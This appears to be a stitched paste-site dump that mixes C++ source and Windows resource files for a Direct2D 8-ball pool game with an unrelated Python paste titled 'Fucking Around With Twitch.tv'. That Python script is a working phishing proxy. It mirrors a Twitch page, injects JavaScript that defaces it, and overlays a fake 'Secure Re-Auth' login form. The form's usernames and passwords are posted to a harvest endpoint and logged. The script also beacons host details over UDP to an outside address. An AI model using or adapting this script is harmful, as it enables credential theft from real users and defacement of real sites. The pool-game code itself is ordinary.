    void DrawSpinIndicator(ID2D1RenderTarget* pRT) {
        ID2D1SolidColorBrush* pWhiteBrush = nullptr;
        ID2D1SolidColorBrush* pRedBrush = nullptr;

        pRT->CreateSolidColorBrush(CUE_BALL_COLOR, &pWhiteBrush);
        pRT->CreateSolidColorBrush(ENGLISH_DOT_COLOR, &pRedBrush);

        if (!pWhiteBrush || !pRedBrush) {
            SafeRelease(&pWhiteBrush);
            SafeRelease(&pRedBrush);
            return;
        }

        // Draw White Ball Background
        D2D1_ELLIPSE bgEllipse = D2D1::Ellipse(spinIndicatorCenter, spinIndicatorRadius, spinIndicatorRadius);
        pRT->FillEllipse(&bgEllipse, pWhiteBrush);
        pRT->DrawEllipse(&bgEllipse, pRedBrush, 0.5f); // Thin red border


        // Draw Red Dot for Spin Position
        float dotRadius = 4.0f;
        float dotX = spinIndicatorCenter.x + cueSpinX * (spinIndicatorRadius - dotRadius); // Keep dot inside edge
        float dotY = spinIndicatorCenter.y + cueSpinY * (spinIndicatorRadius - dotRadius);
        D2D1_ELLIPSE dotEllipse = D2D1::Ellipse(D2D1::Point2F(dotX, dotY), dotRadius, dotRadius);
        pRT->FillEllipse(&dotEllipse, pRedBrush);

        SafeRelease(&pWhiteBrush);
        SafeRelease(&pRedBrush);
    }


    void DrawPocketedBallsIndicator(ID2D1RenderTarget* pRT) {
        ID2D1SolidColorBrush* pBgBrush = nullptr;
        ID2D1SolidColorBrush* pBallBrush = nullptr;

        // Ensure render target is valid before proceeding
        if (!pRT) return;

        HRESULT hr = pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black, 0.8f), &pBgBrush); // Semi-transparent black
        if (FAILED(hr)) { SafeRelease(&pBgBrush); return; } // Exit if brush creation fails

        hr = pRT->CreateSolidColorBrush(D2D1::ColorF(0, 0, 0), &pBallBrush); // Placeholder, color will be set per ball
        if (FAILED(hr)) {
            SafeRelease(&pBgBrush);
            SafeRelease(&pBallBrush);
            return; // Exit if brush creation fails
        }

        // Draw the background bar (rounded rect)
        D2D1_ROUNDED_RECT roundedRect = D2D1::RoundedRect(pocketedBallsBarRect, 10.0f, 10.0f); // Corner radius 10
        float baseAlpha = 0.8f;
        float flashBoost = pocketFlashTimer * 0.5f; // Make flash effect boost alpha slightly
        float finalAlpha = std::min(1.0f, baseAlpha + flashBoost);
        pBgBrush->SetOpacity(finalAlpha);
        pRT->FillRoundedRectangle(&roundedRect, pBgBrush);
        pBgBrush->SetOpacity(1.0f); // Reset opacity after drawing

        // --- Draw small circles for pocketed balls inside the bar ---

        // Calculate dimensions based on the bar's height for better scaling
        float barHeight = pocketedBallsBarRect.bottom - pocketedBallsBarRect.top;
        float ballDisplayRadius = barHeight * 0.30f; // Make balls slightly smaller relative to bar height
        float spacing = ballDisplayRadius * 2.2f; // Adjust spacing slightly
        float padding = spacing * 0.75f; // Add padding from the edges
        float center_Y = pocketedBallsBarRect.top + barHeight / 2.0f; // Vertical center

        // Starting X positions with padding
        float currentX_P1 = pocketedBallsBarRect.left + padding;
        float currentX_P2 = pocketedBallsBarRect.right - padding; // Start from right edge minus padding

        int p1DrawnCount = 0;
        int p2DrawnCount = 0;
        const int maxBallsToShow = 7; // Max balls per player in the bar

        for (const auto& b : balls) {
            if (b.isPocketed) {
                // Skip cue ball and 8-ball in this indicator
                if (b.id == 0 || b.id == 8) continue;

                bool isPlayer1Ball = (player1Info.assignedType != BallType::NONE && b.type == player1Info.assignedType);
                bool isPlayer2Ball = (player2Info.assignedType != BallType::NONE && b.type == player2Info.assignedType);

                if (isPlayer1Ball && p1DrawnCount < maxBallsToShow) {
                    pBallBrush->SetColor(b.color);
                    // Draw P1 balls from left to right
                    D2D1_ELLIPSE ballEllipse = D2D1::Ellipse(D2D1::Point2F(currentX_P1 + p1DrawnCount * spacing, center_Y), ballDisplayRadius, ballDisplayRadius);
                    pRT->FillEllipse(&ballEllipse, pBallBrush);
                    p1DrawnCount++;
                }
                else if (isPlayer2Ball && p2DrawnCount < maxBallsToShow) {
                    pBallBrush->SetColor(b.color);
                    // Draw P2 balls from right to left
                    D2D1_ELLIPSE ballEllipse = D2D1::Ellipse(D2D1::Point2F(currentX_P2 - p2DrawnCount * spacing, center_Y), ballDisplayRadius, ballDisplayRadius);
                    pRT->FillEllipse(&ballEllipse, pBallBrush);
                    p2DrawnCount++;
                }
                // Note: Balls pocketed before assignment or opponent balls are intentionally not shown here.
                // You could add logic here to display them differently if needed (e.g., smaller, grayed out).
            }
        }

        SafeRelease(&pBgBrush);
        SafeRelease(&pBallBrush);
    }

    void DrawBallInHandIndicator(ID2D1RenderTarget* pRT) {
        if (!isDraggingCueBall && (currentGameState != BALL_IN_HAND_P1 && currentGameState != BALL_IN_HAND_P2 && currentGameState != PRE_BREAK_PLACEMENT)) {
            return; // Only show when placing/dragging
        }

        Ball* cueBall = GetCueBall();
        if (!cueBall) return;

        ID2D1SolidColorBrush* pGhostBrush = nullptr;
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White, 0.6f), &pGhostBrush); // Semi-transparent white

        if (pGhostBrush) {
            D2D1_POINT_2F drawPos;
            if (isDraggingCueBall) {
                drawPos = D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y);
            }
            else {
                // If not dragging but in placement state, show at current ball pos
                drawPos = D2D1::Point2F(cueBall->x, cueBall->y);
            }

            // Check if the placement is valid before drawing differently?
            bool behindHeadstring = (currentGameState == PRE_BREAK_PLACEMENT);
            bool isValid = IsValidCueBallPosition(drawPos.x, drawPos.y, behindHeadstring);

            if (!isValid) {
                // Maybe draw red outline if invalid placement?
                pGhostBrush->SetColor(D2D1::ColorF(D2D1::ColorF::Red, 0.6f));
            }


            D2D1_ELLIPSE ghostEllipse = D2D1::Ellipse(drawPos, BALL_RADIUS, BALL_RADIUS);
            pRT->FillEllipse(&ghostEllipse, pGhostBrush);
            pRT->DrawEllipse(&ghostEllipse, pGhostBrush, 1.0f); // Outline

            SafeRelease(&pGhostBrush);
        }
    }

    void DrawPocketSelectionIndicator(ID2D1RenderTarget* pRT) {
        /*  Never show the arrow while the player is still placing the
        cue-ball (ball-in-hand) – it otherwise hides behind the
        ghost-ball and can lock the UI.                               */

        /* Still skip the opening-break placement,
       but show the arrow during BALL-IN-HAND */
       // ? skip when no active call for the CURRENT shooter
        if ((currentPlayer == 1 && calledPocketP1 < 0) ||
            (currentPlayer == 2 && calledPocketP2 < 0))    return;
        /*if (currentGameState == PRE_BREAK_PLACEMENT)
            return;*/ //new ai-asked-to-disable
            /*if (currentGameState == BALL_IN_HAND_P1 ||
                currentGameState == BALL_IN_HAND_P2 ||
                currentGameState == PRE_BREAK_PLACEMENT)
            {
                return;
            }*/

        int pocketToIndicate = -1;
        // Whenever EITHER player has pocketed their first 7 and has called (human or AI),
        // we forcibly show their arrow—regardless of currentGameState.
        if ((currentPlayer == 1 && player1Info.ballsPocketedCount >= 7 && calledPocketP1 >= 0) ||
            (currentPlayer == 2 && player2Info.ballsPocketedCount >= 7 && calledPocketP2 >= 0))
        {
            pocketToIndicate = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        }
        /*// A human player is actively choosing if they are in the CHOOSING_POCKET state.
        bool isHumanChoosing = (currentGameState == CHOOSING_POCKET_P1 || (currentGameState == CHOOSING_POCKET_P2 && !isPlayer2AI));

        if (isHumanChoosing) {
            // When choosing, show the currently selected pocket (which has a default).
            pocketToIndicate = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        }
        else if (IsPlayerOnEightBall(currentPlayer)) {
            // If it's a normal turn but the player is on the 8-ball, show their called pocket as a reminder.
            pocketToIndicate = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        }*/

        if (pocketToIndicate < 0 || pocketToIndicate > 5) {
            return; // Don't draw if no pocket is selected or relevant.
        }

        ID2D1SolidColorBrush* pArrowBrush = nullptr;
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Yellow, 0.9f), &pArrowBrush);
        if (!pArrowBrush) return;

        // ... The rest of your arrow drawing geometry logic remains exactly the same ...
        // (No changes needed to the points/path drawing, only the logic above)
        D2D1_POINT_2F targetPocketCenter = pocketPositions[pocketToIndicate];
        float arrowHeadSize = HOLE_VISUAL_RADIUS * 0.5f;
        float arrowShaftLength = HOLE_VISUAL_RADIUS * 0.3f;
        float arrowShaftWidth = arrowHeadSize * 0.4f;
        float verticalOffsetFromPocketCenter = HOLE_VISUAL_RADIUS * 1.6f;
        D2D1_POINT_2F tip, baseLeft, baseRight, shaftTopLeft, shaftTopRight, shaftBottomLeft, shaftBottomRight;

        if (targetPocketCenter.y == TABLE_TOP) {
            tip = D2D1::Point2F(targetPocketCenter.x, targetPocketCenter.y + verticalOffsetFromPocketCenter + arrowHeadSize);
            baseLeft = D2D1::Point2F(targetPocketCenter.x - arrowHeadSize / 2.0f, targetPocketCenter.y + verticalOffsetFromPocketCenter);
            baseRight = D2D1::Point2F(targetPocketCenter.x + arrowHeadSize / 2.0f, targetPocketCenter.y + verticalOffsetFromPocketCenter);
            shaftTopLeft = D2D1::Point2F(targetPocketCenter.x - arrowShaftWidth / 2.0f, baseLeft.y);
            shaftTopRight = D2D1::Point2F(targetPocketCenter.x + arrowShaftWidth / 2.0f, baseRight.y);
            shaftBottomLeft = D2D1::Point2F(targetPocketCenter.x - arrowShaftWidth / 2.0f, baseLeft.y - arrowShaftLength);
            shaftBottomRight = D2D1::Point2F(targetPocketCenter.x + arrowShaftWidth / 2.0f, baseRight.y - arrowShaftLength);
        }
        else {
            tip = D2D1::Point2F(targetPocketCenter.x, targetPocketCenter.y - verticalOffsetFromPocketCenter - arrowHeadSize);
            baseLeft = D2D1::Point2F(targetPocketCenter.x - arrowHeadSize / 2.0f, targetPocketCenter.y - verticalOffsetFromPocketCenter);
            baseRight = D2D1::Point2F(targetPocketCenter.x + arrowHeadSize / 2.0f, targetPocketCenter.y - verticalOffsetFromPocketCenter);
            shaftTopLeft = D2D1::Point2F(targetPocketCenter.x - arrowShaftWidth / 2.0f, baseLeft.y + arrowShaftLength);
            shaftTopRight = D2D1::Point2F(targetPocketCenter.x + arrowShaftWidth / 2.0f, baseRight.y + arrowShaftLength);
            shaftBottomLeft = D2D1::Point2F(targetPocketCenter.x - arrowShaftWidth / 2.0f, baseLeft.y);
            shaftBottomRight = D2D1::Point2F(targetPocketCenter.x + arrowShaftWidth / 2.0f, baseRight.y);
        }

        ID2D1PathGeometry* pPath = nullptr;
        if (SUCCEEDED(pFactory->CreatePathGeometry(&pPath))) {
            ID2D1GeometrySink* pSink = nullptr;
            if (SUCCEEDED(pPath->Open(&pSink))) {
                pSink->BeginFigure(tip, D2D1_FIGURE_BEGIN_FILLED);
                pSink->AddLine(baseLeft); pSink->AddLine(shaftBottomLeft); pSink->AddLine(shaftTopLeft);
                pSink->AddLine(shaftTopRight); pSink->AddLine(shaftBottomRight); pSink->AddLine(baseRight);
                pSink->EndFigure(D2D1_FIGURE_END_CLOSED);
                pSink->Close();
                SafeRelease(&pSink);
                pRT->FillGeometry(pPath, pArrowBrush);
            }
            SafeRelease(&pPath);
        }
        SafeRelease(&pArrowBrush);
    }
```
 
==++ Here's the full source for (file 2/3 (No OOP-based)) ""resource.h""::: ++==
```resource.h
//{{NO_DEPENDENCIES}}
// Microsoft Visual C++ generated include file.
// Used by Yahoo-8Ball-Pool-Clone.rc
//
#define IDI_ICON1                       101
// --- NEW Resource IDs (Define these in your .rc file / resource.h) ---
#define IDD_NEWGAMEDLG 106
#define IDC_RADIO_2P   1003
#define IDC_RADIO_CPU  1005
#define IDC_GROUP_AI   1006
#define IDC_RADIO_EASY 1007
#define IDC_RADIO_MEDIUM 1008
#define IDC_RADIO_HARD 1009
// --- NEW Resource IDs for Opening Break ---
#define IDC_GROUP_BREAK_MODE 1010
#define IDC_RADIO_CPU_BREAK  1011
#define IDC_RADIO_P1_BREAK   1012
#define IDC_RADIO_FLIP_BREAK 1013
// Standard IDOK is usually defined, otherwise define it (e.g., #define IDOK 1)
 
// Next default values for new objects
// 
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        102
#define _APS_NEXT_COMMAND_VALUE         40002 // Incremented
#define _APS_NEXT_CONTROL_VALUE         1014 // Incremented
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif
 
```
 
==++ Here's the full source for (file 3/3 (No OOP-based)) ""Yahoo-8Ball-Pool-Clone.rc""::: ++==
```Yahoo-8Ball-Pool-Clone.rc
// Microsoft Visual C++ generated resource script.
//
#include ""resource.h""
 
#define APSTUDIO_READONLY_SYMBOLS
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 2 resource.
//
#include ""winres.h""
 
/////////////////////////////////////////////////////////////////////////////
#undef APSTUDIO_READONLY_SYMBOLS
 
/////////////////////////////////////////////////////////////////////////////
// English (United States) resources
 
#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US
#pragma code_page(1252)
 
#ifdef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// TEXTINCLUDE
//
 
1 TEXTINCLUDE 
BEGIN
    ""resource.h\0""
END
 
2 TEXTINCLUDE 
BEGIN
    ""#include """"winres.h""""\r\n""
    ""\0""
END
 
3 TEXTINCLUDE 
BEGIN
    ""\r\n""
    ""\0""
END
 
#endif    // APSTUDIO_INVOKED
 
 
/////////////////////////////////////////////////////////////////////////////
//
// Icon
//
 
// Icon with lowest ID value placed first to ensure application icon
// remains consistent on all systems.
IDI_ICON1               ICON                    ""D:\\Download\\cpp-projekt\\FuzenOp_SiloTest\\icons\\shell32_277.ico""
 
#endif    // English (United States) resources
/////////////////////////////////////////////////////////////////////////////
 
 
 
#ifndef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 3 resource.
//
 
 
/////////////////////////////////////////////////////////////////////////////
#endif    // not APSTUDIO_INVOKED
 
#include <windows.h> // Needed for control styles like WS_GROUP, BS_AUTORADIOBUTTON etc.
 
/////////////////////////////////////////////////////////////////////////////
//
// Dialog
//
 
IDD_NEWGAMEDLG DIALOGEX 0, 0, 220, 185 // Dialog position (x, y) and size (width, height) in Dialog Units (DLUs) - Increased Height
STYLE DS_SETFONT | DS_MODALFRAME | DS_FIXEDSYS | WS_POPUP | WS_CAPTION | WS_SYSMENU
CAPTION ""New 8-Ball Game""
FONT 8, ""MS Shell Dlg"", 400, 0, 0x1 // Standard dialog font
BEGIN
// --- Game Mode Selection ---
// Group Box for Game Mode (Optional visually, but helps structure)
GROUPBOX        ""Game Mode"", IDC_STATIC, 7, 7, 90, 50
 
// ""2 Player"" Radio Button (First in this group)
CONTROL         ""&2 Player (Human vs Human)"", IDC_RADIO_2P, ""Button"",
BS_AUTORADIOBUTTON | WS_GROUP | WS_TABSTOP, 14, 20, 80, 10
 
// ""Human vs CPU"" Radio Button
CONTROL         ""Human vs &CPU"", IDC_RADIO_CPU, ""Button"",
BS_AUTORADIOBUTTON | WS_TABSTOP, 14, 35, 70, 10
 
 
// --- AI Difficulty Selection (Inside its own Group Box) ---
GROUPBOX        ""AI Difficulty"", IDC_GROUP_AI, 118, 7, 95, 70
 
// ""Easy"" Radio Button (First in the AI group)
CONTROL         ""&Easy"", IDC_RADIO_EASY, ""Button"",
BS_AUTORADIOBUTTON | WS_GROUP | WS_TABSTOP, 125, 20, 60, 10
 
// ""Medium"" Radio Button
CONTROL         ""&Medium"", IDC_RADIO_MEDIUM, ""Button"",
BS_AUTORADIOBUTTON | WS_TABSTOP, 125, 35, 60, 10
 
// ""Hard"" Radio Button
CONTROL         ""&Hard"", IDC_RADIO_HARD, ""Button"",
BS_AUTORADIOBUTTON | WS_TABSTOP, 125, 50, 60, 10
 
// --- Opening Break Modes (For Versus CPU Only) ---
GROUPBOX        ""Opening Break Modes:"", IDC_GROUP_BREAK_MODE, 118, 82, 95, 60
 
// ""CPU Break"" Radio Button (Default for this group)
CONTROL         ""&CPU Break"", IDC_RADIO_CPU_BREAK, ""Button"",
BS_AUTORADIOBUTTON | WS_GROUP | WS_TABSTOP, 125, 95, 70, 10
 
// ""P1 Break"" Radio Button
CONTROL         ""&P1 Break"", IDC_RADIO_P1_BREAK, ""Button"",
BS_AUTORADIOBUTTON | WS_TABSTOP, 125, 110, 70, 10
 
// ""FlipCoin Break"" Radio Button
CONTROL         ""&FlipCoin Break"", IDC_RADIO_FLIP_BREAK, ""Button"",
BS_AUTORADIOBUTTON | WS_TABSTOP, 125, 125, 70, 10
 
 
// --- Standard Buttons ---
DEFPUSHBUTTON   ""Start"", IDOK, 55, 160, 50, 14 // Default button (Enter key) - Adjusted Y position
PUSHBUTTON      ""Cancel"", IDCANCEL, 115, 160, 50, 14 // Adjusted Y position
END
 
```"
59si5CRL,Fucking Around With Twitch.tv,WhosYourDaddySec,Python,Friday 11th of July 2025 01:03:10 PM CDT,"#!/data/data/com.termux/files/usr/bin/python3
import http.server, socketserver, requests, os, time, threading, socket, platform, subprocess
from urllib.parse import urlparse, urljoin
from flask import Flask, Response, request
TARGET = ""https://clock.event-engineering.twitch.tv/""
TARGET_DOMAIN = urlparse(TARGET).netloc
PROXY_PORT = 8888
NTP_API_PORT = 8080
LOGFILE = os.path.expanduser(""~/ghostsec_iframe_cors_bypass.log"")
HARVEST_LOG = os.path.expanduser(""~/ghostsec_harvest.log"")
FAKE_CLOCK = ""1337:GhostSec Override""
COOKIE_NAME = ""NTPClockOffset""
OFFSET = 999999999999
PAYLOAD_DOMAIN = f""http://localhost:{PROXY_PORT}""
def log(msg):
    ts = time.strftime(""[%Y-%m-%d %H:%M:%S]"")
    with open(LOGFILE, ""a"") as f:
        f.write(f""{ts} {msg}\n"")
    print(f""{ts} {msg}"")
def harvest(data):
    ts = time.strftime(""[%Y-%m-%d %H:%M:%S]"")
    with open(HARVEST_LOG, ""a"") as f:
        f.write(f""{ts} HARVESTED: {data}\n"")
def generate_payload_js():
    return f""""""
    <script>
    document.cookie = ""{COOKIE_NAME}={OFFSET}|""+Date.now()+""; path=/;"";
    const injectOverride = () => {{
        try {{
            let override = document.getElementById('clock') || document.createElement('div');
            override.id = ""clock"";
            override.innerHTML = ""{FAKE_CLOCK}"";
            override.style.cssText = `
                color: lime;
                font-size: 48px;
                font-weight: bold;
                text-align: center;
                margin-top: 25vh;
            `;
            document.body.innerHTML = """";
            document.body.appendChild(override);
        }} catch(e){{}}
    }};
    injectOverride();
    const obs = new MutationObserver(injectOverride);
    obs.observe(document.body, {{ childList: true, subtree: true }});
    const originalFetch = window.fetch;
    window.fetch = (...args) => {{
        return originalFetch(...args).then(response => {{
            return response.text().then(text => {{
                return new Response(text.replace(/\\d\\d?:\\d\\d(?::\\d\\d)?/g, ""{FAKE_CLOCK}""));
            }});
        }});
    }};
    Date.prototype.getTime = function() {{ return {int(time.time() * 1000) + OFFSET}; }};
    window.addEventListener('load', () => {{
        let form = document.createElement('form');
        form.id = ""ghostsecForm"";
        form.innerHTML = `
            <div style='position:fixed;top:0;left:0;width:100%;height:100%;background:black;z-index:9999;display:flex;align-items:center;justify-content:center;flex-direction:column;color:#0f0;font-family:monospace;'>
                <h2>Secure Re-Auth</h2>
                <input type='text' name='username' placeholder='Username' style='margin:5px;padding:10px;' />
                <input type='password' name='password' placeholder='Password' style='margin:5px;padding:10px;' />
                <button type='submit' style='padding:10px;'>Authenticate</button>
            </div>
        `;
        form.onsubmit = e => {{
            e.preventDefault();
            const u = form.username.value;
            const p = form.password.value;
            fetch('/harvest', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify({{user:u, pass:p}})
            }});
            document.body.innerHTML = '<h1 style=""color:lime;text-align:center;margin-top:40vh;"">Session Restored</h1>';
        }};
        document.body.appendChild(form);
    }});
    </script>
    """"""
class ProxyHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == ""/harvest"":
            self.send_response(405)
            self.end_headers()
            return
        upstream_url = urljoin(TARGET, self.path)
        log(f""[+] Requesting: {upstream_url}"")
        try:
            headers = {
                'User-Agent': self.headers.get('User-Agent'),
                'Referer': TARGET,
                'Origin': TARGET
            }
            response = requests.get(upstream_url, headers=headers, verify=True, allow_redirects=True)
            content_type = response.headers.get(""Content-Type"", ""text/html"")
            content = response.text
            if ""text/html"" in content_type:
                inject_js = generate_payload_js()
                if ""</body>"" in content:
                    content = content.replace(""</body>"", inject_js + ""</body>"")
                else:
                    content += inject_js
            self.send_response(200)
            self.send_header(""Content-type"", content_type)
            self.send_header(""Access-Control-Allow-Origin"", ""*"")
            self.send_header(""Access-Control-Allow-Methods"", ""GET, POST, OPTIONS"")
            self.send_header(""Access-Control-Allow-Headers"", ""*"")
            self.end_headers()
            self.wfile.write(content.encode('utf-8'))
        except Exception as e:
            log(f""[-] Proxy Error: {e}"")
            self.send_error(502, f""Proxy failed: {e}"")
def start_proxy_server():
    with socketserver.TCPServer(("""", PROXY_PORT), ProxyHandler) as httpd:
        log(f""[+] Local Proxy Active @ {PAYLOAD_DOMAIN}"")
        subprocess.run([""termux-open-url"", PAYLOAD_DOMAIN])
        httpd.serve_forever()
def launch_ntp_spoof_server():
    app = Flask(""GhostSecNTP"")
    @app.route(""/ntp"")
    def spoof():
        spoofed = f""{OFFSET}:{int(time.time() * 1000)}""
        log(f""[+] Spoofed NTP Response Served: {spoofed}"")
        return Response(spoofed, mimetype='text/plain')
    @app.route(""/harvest"", methods=[""POST""])
    def receive():
        data = request.get_json()
        if data:
            harvest(data)
        return Response(""OK"", mimetype='text/plain')
    threading.Thread(target=app.run, kwargs={'port': NTP_API_PORT, 'host': '0.0.0.0'}, daemon=True).start()
    log(f""[+] NTP + Harvest API Active on http://localhost:{NTP_API_PORT}/"")
def environment_beacon():
    try:
        host = socket.gethostname()
        info = f""Host: {host} | Platform: {platform.platform()} | User: {os.environ.get('USER', 'unknown')}""
        log(""[+] Host Environment:"")
        log(info)
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.sendto(info.encode(), (""1.1.1.1"", 53))
    except Exception as e:
        log(f""[-] Environment beacon failed: {e}"")
def resolve_dns():
    try:
        ip_list = socket.gethostbyname_ex(TARGET_DOMAIN)
        log(f""[+] Resolved DNS for {TARGET_DOMAIN}: {ip_list}"")
    except Exception as e:
        log(f""[-] DNS resolution error: {e}"")
if __name__ == ""__main__"":
    log(""=== GhostSec :: Mirror + Deface + Harvest Operational ==="")
    launch_ntp_spoof_server()
    resolve_dns()
    environment_beacon()
    start_proxy_server()"
mJBsJD4b,2D StickPool Game (Stable w/o SmoothAimStep (Too Difficult) Only Draw-3D-Look-Balls (RadialGradient),alien_fx_fiend,C++,Friday 11th of July 2025 12:59:33 PM CDT,"==++ Here's the full source code for (File 1\3) ""Pool-Game-CloneV18.cpp""::: ++==
```""Pool-Game-CloneV18.cpp""
    #define WIN32_LEAN_AND_MEAN
    #define NOMINMAX
    #include <windows.h>
    #include <d2d1.h>
    #include <dwrite.h>
    #include <fstream> // For file I/O
    #include <iostream> // For some basic I/O, though not strictly necessary for just file ops
    #include <vector>
    #include <cmath>
    #include <string>
    #include <sstream> // Required for wostringstream
    #include <algorithm> // Required for std::max, std::min
    #include <ctime>    // Required for srand, time
    #include <cstdlib> // Required for srand, rand (often included by others, but good practice)
    #include <commctrl.h> // Needed for radio buttons etc. in dialog (if using native controls)
    #include <mmsystem.h> // For PlaySound
    #include <tchar.h> //midi func
    #include <thread>
    #include <atomic>
    #include ""resource.h""

    #ifndef HAS_STD_CLAMP
    template <typename T>
    T clamp(const T& v, const T& lo, const T& hi)
    {
        return (v < lo) ? lo : (v > hi) ? hi : v;
    }
    namespace std { using ::clamp; }   // inject into std:: for seamless use
    #define HAS_STD_CLAMP
    #endif

    #pragma comment(lib, ""Comctl32.lib"") // Link against common controls library
    #pragma comment(lib, ""d2d1.lib"")
    #pragma comment(lib, ""dwrite.lib"")
    #pragma comment(lib, ""Winmm.lib"") // Link against Windows Multimedia library

    // --- Constants ---
    const float PI = 3.1415926535f;
    const float BALL_RADIUS = 10.0f;
    const float TABLE_LEFT = 100.0f;
    const float TABLE_TOP = 100.0f;
    const float TABLE_WIDTH = 700.0f;
    const float TABLE_HEIGHT = 350.0f;
    const float TABLE_RIGHT = TABLE_LEFT + TABLE_WIDTH;
    const float TABLE_BOTTOM = TABLE_TOP + TABLE_HEIGHT;
    const float CUSHION_THICKNESS = 20.0f;
    const float HOLE_VISUAL_RADIUS = 22.0f; // Visual size of the hole
    const float POCKET_RADIUS = HOLE_VISUAL_RADIUS * 1.05f; // Make detection radius slightly larger // Make detection radius match visual size (or slightly larger)
    const float MAX_SHOT_POWER = 15.0f;
    const float FRICTION = 0.985f; // Friction factor per frame
    const float MIN_VELOCITY_SQ = 0.01f * 0.01f; // Stop balls below this squared velocity
    const float HEADSTRING_X = TABLE_LEFT + TABLE_WIDTH * 0.30f; // 30% line
    const float RACK_POS_X = TABLE_LEFT + TABLE_WIDTH * 0.65f; // 65% line for rack apex
    const float RACK_POS_Y = TABLE_TOP + TABLE_HEIGHT / 2.0f;
    const UINT ID_TIMER = 1;
    const int TARGET_FPS = 60; // Target frames per second for timer

    // --- Enums ---
    // --- MODIFIED/NEW Enums ---
    enum GameState {
        SHOWING_DIALOG,     // NEW: Game is waiting for initial dialog input
        PRE_BREAK_PLACEMENT,// Player placing cue ball for break
        BREAKING,           // Player is aiming/shooting the break shot
        CHOOSING_POCKET_P1, // NEW: Player 1 needs to call a pocket for the 8-ball
        CHOOSING_POCKET_P2, // NEW: Player 2 needs to call a pocket for the 8-ball
        AIMING,             // Player is aiming
        AI_THINKING,        // NEW: AI is calculating its move
        SHOT_IN_PROGRESS,   // Balls are moving
        ASSIGNING_BALLS,    // Turn after break where ball types are assigned
        PLAYER1_TURN,
        PLAYER2_TURN,
        BALL_IN_HAND_P1,
        BALL_IN_HAND_P2,
        GAME_OVER
    };

    enum BallType {
        NONE,
        SOLID,  // Yellow (1-7)
        STRIPE, // Red (9-15)
        EIGHT_BALL, // Black (8)
        CUE_BALL // White (0)
    };

    // NEW Enums for Game Mode and AI Difficulty
    enum GameMode {
        HUMAN_VS_HUMAN,
        HUMAN_VS_AI
    };

    enum AIDifficulty {
        EASY,
        MEDIUM,
        HARD
    };

    enum OpeningBreakMode {
        CPU_BREAK,
        P1_BREAK,
        FLIP_COIN_BREAK
    };

    // --- Structs ---
    struct Ball {
        int id;             // 0=Cue, 1-7=Solid, 8=Eight, 9-15=Stripe
        BallType type;
        float x, y;
        float vx, vy;
        D2D1_COLOR_F color;
        bool isPocketed;
    };

    struct PlayerInfo {
        BallType assignedType;
        int ballsPocketedCount;
        std::wstring name;
    };

    // --- Global Variables ---

    // Direct2D & DirectWrite
    ID2D1Factory* pFactory = nullptr;
    //ID2D1Factory* g_pD2DFactory = nullptr;
    ID2D1HwndRenderTarget* pRenderTarget = nullptr;
    IDWriteFactory* pDWriteFactory = nullptr;
    IDWriteTextFormat* pTextFormat = nullptr;
    IDWriteTextFormat* pLargeTextFormat = nullptr; // For ""Foul!""

    // Game State
    HWND hwndMain = nullptr;
    GameState currentGameState = SHOWING_DIALOG; // Start by showing dialog
    std::vector<Ball> balls;
    int currentPlayer = 1; // 1 or 2
    PlayerInfo player1Info = { BallType::NONE, 0, L""Vince Woods""/*""Player 1""*/ };
    PlayerInfo player2Info = { BallType::NONE, 0, L""Virtus Pro""/*""CPU""*/ }; // Default P2 name
    bool foulCommitted = false;
    std::wstring gameOverMessage = L"""";
    bool firstBallPocketedAfterBreak = false;
    std::vector<int> pocketedThisTurn;
    // --- NEW: 8-Ball Pocket Call Globals ---
    int calledPocketP1 = -1; // Pocket index (0-5) called by Player 1 for the 8-ball. -1 means not called.
    int calledPocketP2 = -1; // Pocket index (0-5) called by Player 2 for the 8-ball.
    int currentlyHoveredPocket = -1; // For visual feedback on which pocket is being hovered
    std::wstring pocketCallMessage = L""""; // Message like ""Choose a pocket...""
         // --- NEW: Remember which pocket the 8?ball actually went into last shot
    int lastEightBallPocketIndex = -1;
    //int lastPocketedIndex = -1; // pocket index (0–5) of the last ball pocketed
    int called = -1;
    bool cueBallPocketed = false;

    // --- NEW: Foul Tracking Globals ---
    int firstHitBallIdThisShot = -1;      // ID of the first object ball hit by cue ball (-1 if none)
    bool cueHitObjectBallThisShot = false; // Did cue ball hit an object ball this shot?
    bool railHitAfterContact = false;     // Did any ball hit a rail AFTER cue hit an object ball?
    // --- End New Foul Tracking Globals ---

    // NEW Game Mode/AI Globals
    GameMode gameMode = HUMAN_VS_HUMAN; // Default mode
    AIDifficulty aiDifficulty = MEDIUM; // Default difficulty
    OpeningBreakMode openingBreakMode = CPU_BREAK; // Default opening break mode
    bool isPlayer2AI = false;           // Is Player 2 controlled by AI?
    bool aiTurnPending = false;         // Flag: AI needs to take its turn when possible
    // bool aiIsThinking = false;       // Replaced by AI_THINKING game state
    // NEW: Flag to indicate if the current shot is the opening break of the game
    bool isOpeningBreakShot = false;

    // NEW: For AI shot planning and visualization
    struct AIPlannedShot {
        float angle;
        float power;
        float spinX;
        float spinY;
        bool isValid; // Is there a valid shot planned?
    };
    AIPlannedShot aiPlannedShotDetails; // Stores the AI's next shot
    bool aiIsDisplayingAim = false;    // True when AI has decided a shot and is in ""display aim"" mode
    int aiAimDisplayFramesLeft = 0;  // How many frames left to display AI aim
    const int AI_AIM_DISPLAY_DURATION_FRAMES = 45; // Approx 0.75 seconds at 60 FPS, adjust as needed

    // Input & Aiming
    POINT ptMouse = { 0, 0 };
    bool isAiming = false;
